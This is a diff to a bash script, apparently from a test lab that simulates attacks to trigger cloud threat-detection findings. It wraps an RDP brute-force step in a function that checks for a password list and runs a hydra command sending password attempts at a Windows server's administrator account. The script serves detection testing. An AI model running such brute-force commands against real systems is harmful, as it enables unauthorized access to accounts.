@@ -13,11 +13,12 @@
 
 #!/bin/bash
 
-# load IP addresses created by templates
-source localIps.sh
+function rdp_bruteforce {
 
-# simulate external recon
-#echo 'External port probe on a temporarily unprotected port'
+PW_LIST_PATH=$1/passwords
+
+if [[ -d "$PW_LIST_PATH" ]]; then 
+
 echo '-----------------------------------------------------------------------'
 echo
 # 3 - rdp brute force with known user and list of passwords found on web
@@ -31,7 +32,7 @@ echo '* windows instance.                                                   *'
 echo '***********************************************************************'
 echo
 echo 'Sending 250 password attempts at the windows server...'
-hydra -t 4 -f -l administrator -P ./passwords/password_list.txt rdp://$BASIC_WINDOWS_TARGET
+hydra -t 4 -f -l administrator -P $PW_LIST_PATH/password_list.txt rdp://$BASIC_WINDOWS_TARGET
 echo
 echo '-----------------------------------------------------------------------'
 echo
@@ -41,3 +42,9 @@ echo 'Outbound: ' $RED_TEAM_INSTANCE ' is performing RDP brute force attacks aga
 echo 'Inbound: ' $RED_TEAM_IP ' is performing RDP brute force attacks against ' $BASIC_WINDOWS_INSTANCE
 echo 'Finding Type : UnauthorizedAccess:EC2/RDPBruteForce'
 echo
+
+else
+  echo "ERROR: required file "$PW_LIST_PATH"/password_list.txt does not exist"
+fi
+
+}
